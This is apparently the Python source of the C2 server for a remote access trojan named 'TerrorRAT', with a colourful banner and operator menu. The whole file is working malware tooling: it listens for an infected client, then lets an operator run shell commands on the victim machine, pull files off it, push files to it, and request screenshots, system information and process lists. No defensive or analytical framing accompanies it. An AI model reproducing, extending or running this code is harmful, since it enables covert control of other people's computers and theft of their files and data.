import socket
import os
from time import sleep
import sys
from colorama import init, Fore, Style, Back
from datetime import datetime


init(autoreset=True)

COLOR_PRIMARY = Fore.CYAN + Style.BRIGHT
COLOR_SECONDARY = Fore.GREEN + Style.BRIGHT
COLOR_ACCENT = Fore.YELLOW + Style.BRIGHT
COLOR_ERROR = Fore.LIGHTRED_EX + Style.DIM
COLOR_INFO = Fore.GREEN + Style.BRIGHT
COLOR_WARNING = Fore.YELLOW
COLOR_RESET = Style.RESET_ALL
COLOR_BACKGROUND = Back.BLACK
COLOR_MAGENTA = Fore.CYAN + Style.DIM

COLOR_TERRIFYING_RED = Fore.LIGHTRED_EX + Style.BRIGHT
COLOR_TERRIFYING_ACCENT = Fore.LIGHTYELLOW_EX + Style.BRIGHT

def generate_ascii_art():

    return f"""
{COLOR_MAGENTA}
  ██████████ ██████  ███████      ███████        ███████     ███████         ███████             ███   ████████████
      ██     ██      ██     █     ██     █     ██       ██   ██     █        ██     █           █████       ██
      ██     ██      ██      █    ██      █   ██         ██  ██      █       ██      █         ██   ██      ██
      ██     █████   ████████     ████████    ██         ██  ████████        ████████         █████████     ██
      ██     ██      ██     ██    ██     ██   ██         ██  ██     ██       ██      ██      ██       ██    ██
      ██     ██      ██      ██   ██      ██   ██       ██   ██      ██      ██       ██    ██         ██   ██
      ██     ██████  ██       ██  ██       ██    ███████     ██       ██     ██        ██  ██           ██  ██
   ╚════════════════════════════════════════════════════════════════════ The nightmare of the scared RATS :) ═══════╝
{COLOR_RESET}
"""


# --- Constants for Messages ---
INFO = f"{COLOR_INFO}[INFO] {COLOR_RESET}"
DOWNLOAD = f"{COLOR_SECONDARY}[DOWNLOAD] {COLOR_RESET}"
UPLOAD = f"{COLOR_SECONDARY}[UPLOAD] {COLOR_RESET}"
ERROR = f"{COLOR_ERROR}[ERROR] {COLOR_RESET}"
COMMAND_PROMPT = f"{COLOR_PRIMARY}TerrorRAT {COLOR_ACCENT}>> {COLOR_RESET}"
CONNECTION_LOST = f"{COLOR_ERROR}Connection lost with client.{COLOR_RESET}"


class server:
    server_socket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_ip=""
    server_port=""

    
    def __init__(self,server_ip,server_port):
        self.server_ip=server_ip
        self.server_port=server_port
        
    def server_download(self,file_name):
        response = self.server_socket.recv(len("Yes".encode()))
        total_response="".encode()
        response_str = response.decode()
        if response =="Yes".encode():
            
            response_str=response_str.replace("Yes","")
            total_response+=response_str.encode()
            print("Downloading file...\n")
            while True:
                response = self.server_socket.recv(2048)
                end_marker = b"ENDOFMESSAGE"
                if end_marker in response:
                    # Split the chunk at the marker. The data before is the last part of the file.
                    parts = response.split(end_marker)
                    total_response += parts[0]
                    break
                else:
                    total_response += response

            with open(file_name,"xb") as file:
                file.write(total_response)
                print("File downloaded successfully.\n")
                file.close()

        else:
            print("File does not exist!Try again...\n")
            exit

    def server_upload(self,path_input):
        if os.path.exists(path_input):
            chunk_read = "Yes"
            with open(path_input,"rb") as file:
                chunk = file.read(2048).decode()
                chunk_read+=chunk
                while len(chunk) >0:
                    chunk=file.read(2048).decode()    
                    chunk_read+=chunk          
                chunk_read+="ENDOFMESSAGE"
                chunk_Byte=chunk_read.encode()
                self.server_socket.sendall(chunk_Byte)
                file.close()
                

    def server_c2_connector(self,):
        self.server_ip = self.server_ip
        self.server_port = self.server_port
        self.server_socket.bind((self.server_ip,int(self.server_port)))
        self.server_socket.listen(10)
        print("Listening for incoming connections...\n")
        self.server_socket, client_address = self.server_socket.accept()
        print("IP:{} Connected successfully!\n".format(client_address))
        try:
            while True:
                command = input("TerrorRAT >> ")
                self.server_socket.send(command.encode())

                if command=="Exit":
                    self.server_socket.close()
                    return
                
                elif command.startswith("cd"):
                    continue #Because cd doesn't return any output

                elif command.startswith("download"):
                    file_path = command.strip("download ")
                    file_name_with_ext = os.path.basename(file_path)
                    file_name="./Downloads/"+file_name_with_ext
                    if not os.path.exists("./Downloads"):
                        os.makedirs("./Downloads")
                    counter = 1
                    while os.path.exists(file_name):
                        name, extention = os.path.splitext(file_name)
                        file_name = f"{name}({counter}){extention}"
                        counter += 1            
                    self.server_download(file_name)




                    continue

                elif command.startswith("upload"):
                    path_input=command.strip("upload ")
                    self.server_upload(path_input)
                    continue
                elif command=="screenshot":
                    print("Screenshot taken successfully and saved at './Screenshots' folder...\n")
                    continue

                total_response=""
                while True:
                    response = self.server_socket.recv(2048)
                    total_response+=response.decode()
                    if total_response.endswith("ENDOFMESSAGE"):
                        total_response=total_response.replace("ENDOFMESSAGE", "")
                        break
                print(total_response+"\n")
                sleep(1)
        except Exception as e: print(f"Exception occured:{e}")
        self.server_socket.close()
        exit

def display_menu():
        """Displays the interactive command menu with cyberpunk theme."""
        print("\n" + COLOR_SECONDARY + "="*120)
        print(generate_ascii_art())
        print(COLOR_SECONDARY + "="*120)
        print(f"{COLOR_ACCENT}       Cyber Operations Menu")
        print(f"{COLOR_SECONDARY}----------------------------------------------------------")
        print(f"{COLOR_PRIMARY}  File Operations:")
        print(f"    download {COLOR_WARNING}<client_path>{COLOR_PRIMARY}   - Download file from client")
        print(f"    upload {COLOR_WARNING}<local_path>{COLOR_PRIMARY}      - Upload file to client")
        print(f"{COLOR_PRIMARY}  System Operations:")
        print(f"    screenshot             - Take a screenshot of the client")
        print(f"    sysinfo                - Get system information")
        print(f"    pslist                 - List running processes")
        print(f"    tasks                  - List running tasks (Windows)")
        print(f"    cd {COLOR_WARNING}<directory>{COLOR_PRIMARY}           - Change directory on client")
        print(f"{COLOR_PRIMARY}  Execution:")
        print(f"{COLOR_WARNING}   <command>{COLOR_PRIMARY}                 - Execute a shell command")
        print(f"{COLOR_PRIMARY}  Other:")
        print(f"    help                   - Show this menu")
        print(f"    Exit                   - Disconnect client and exit server")
        print(COLOR_SECONDARY + "="*60 + COLOR_RESET + "\n")


if __name__=="__main__":

    # Basic Input validation for IP and Port
    while True:
        input_ip = input("Enter the IP address to bind to (e.g., 127.0.0.1 or 0.0.0.0 for all interfaces):\n").strip()
        if not input_ip:
            print("IP address cannot be empty.")
            continue
        try:
            socket.inet_aton(input_ip)
            break
        except socket.error:
            print("Invalid IP address format. Please enter a valid IPv4 address.")

    while True:
        input_port_str = input("Enter the port number (e.g., 7900):\n").strip()
        if not input_port_str:
            print("Port number cannot be empty.")
            continue
        try:
            input_port = int(input_port_str)
            if 0 < input_port <= 65535:
                break
            else:
                print("Port number must be between 1 and 65535.")
        except ValueError:
            print("Invalid port number. Please enter a number.")
    display_menu()
    print("\nTerrorRAT C2 Server starting...")
    c2server = server(input_ip, input_port)
    c2server.server_c2_connector()
